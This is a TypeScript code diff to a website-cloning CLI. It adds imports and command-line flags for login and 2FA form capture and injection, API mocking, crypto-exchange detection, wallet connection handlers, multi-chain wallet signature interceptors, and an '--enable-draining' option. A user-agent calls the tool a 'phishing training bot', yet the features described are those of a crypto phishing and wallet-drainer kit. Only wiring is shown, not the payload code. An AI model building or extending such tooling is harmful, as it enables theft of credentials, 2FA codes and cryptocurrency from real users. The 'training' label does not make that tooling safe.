@@ -144,6 +144,64 @@ import {
   DEFAULT_HARDENING_CONFIG,
   type HardeningReport,
 } from './lib/clone-resilience-hardening.js'
+import {
+  discoverPlatformRepo,
+  extractComponentLibrary,
+  type PlatformRepo,
+} from './lib/github-repo-extractor.js'
+import {
+  extractLoginForms,
+  buildLoginInjectionCode,
+  captureLoginFlowScreenshots,
+  type CapturedLoginFlow,
+} from './lib/login-form-extractor.js'
+import {
+  detect2FAForms,
+  build2FAInjectionCode,
+  type DetectedTwoFA,
+} from './lib/2fa-form-detector.js'
+import {
+  captureApiResponses,
+  buildApiMockingCode,
+  saveApiResponses,
+  type CapturedApiResponses,
+} from './lib/api-response-capture.js'
+import {
+  detectPlatformType,
+  buildCexModeInjectionCode,
+  type PlatformDetection,
+} from './lib/cex-mode-detector.js'
+import {
+  compareOriginalVsClone,
+  generateQualityReport,
+  type QualityCheck,
+} from './lib/clone-quality-checker.js'
+import {
+  discoverWalletRepo,
+  extractWalletCode,
+  extractAllWallets,
+  type ExtractedWalletCode,
+} from './lib/wallet-repo-integrator.js'
+import {
+  buildBrowserExtensionConnectionCode,
+  buildHardwareWalletConnectionCode,
+  buildMobileWalletDeepLinkHandler,
+  buildWalletConnectHandler,
+  buildUniversalWalletDetector,
+} from './lib/wallet-connection-handler.js'
+import {
+  buildEthereumSignatureInterceptor,
+  buildSolanaSignatureInterceptor,
+  buildTronSignatureInterceptor,
+  buildHardwareWalletSignatureInterceptor,
+  buildUniversalSignatureCapture,
+} from './lib/signature-interceptor.js'
+import {
+  routeAndGenerateClone,
+  buildPlatformRouterCode,
+  type PlatformRouteConfig,
+  type RouterResult,
+} from './lib/platform-router.js'
 
 const TRAINING_UA =
   'Legion-Phishing-Training-Bot/1.0 (authorized-internal; respects-robots; no-index)'
@@ -198,6 +256,12 @@ function parseCli(argv: string[]): {
   experimental: boolean
   forceHardwareBypass: boolean
   productionClone: boolean
+  extractRepoComponents: boolean
+  captureLogin: boolean
+  capture2FA: boolean
+  extractWallets: boolean
+  enableUniversalMode: boolean
+  enableDraining: boolean
   positional: string[]
 } {
   const features: TrainingCloneFeatures = {
@@ -233,11 +297,23 @@ function parseCli(argv: string[]): {
   let experimental = false
   let forceHardwareBypass = false
   let productionClone = false
+  let extractRepoComponents = false
+  let captureLogin = false
+  let capture2FA = false
+  let extractWallets = false
+  let enableUniversalMode = false
+  let enableDraining = false
   const positional: string[] = []
 
   for (let i = 0; i < argv.length; i++) {
     const arg = argv[i]!
     if (arg === '--mirror') mirror = true
+    else if (arg === '--extract-repo-components') extractRepoComponents = true
+    else if (arg === '--capture-login') captureLogin = true
+    else if (arg === '--capture-2fa') capture2FA = true
+    else if (arg === '--extract-wallets') extractWallets = true
+    else if (arg === '--enable-universal-mode') enableUniversalMode = true
+    else if (arg === '--enable-draining') enableDraining = true
     else if (arg === '--log-forms') logForms = true
     else if (arg === '--test-login') testLogin = true
     else if (arg === '--replay-original') replayOriginal = true
@@ -311,6 +387,12 @@ function parseCli(argv: string[]): {
     experimental,
     forceHardwareBypass,
     productionClone,
+    extractRepoComponents,
+    captureLogin,
+    capture2FA,
+    extractWallets,
+    enableUniversalMode,
+    enableDraining,
     positional,
   }
 }
@@ -1283,6 +1365,12 @@ async function main(): Promise<void> {
     experimental,
     forceHardwareBypass,
     productionClone,
+    extractRepoComponents,
+    captureLogin,
+    capture2FA,
+    extractWallets,
+    enableUniversalMode,
+    enableDraining,
     positional,
   } = parseCli(process.argv.slice(2))
 
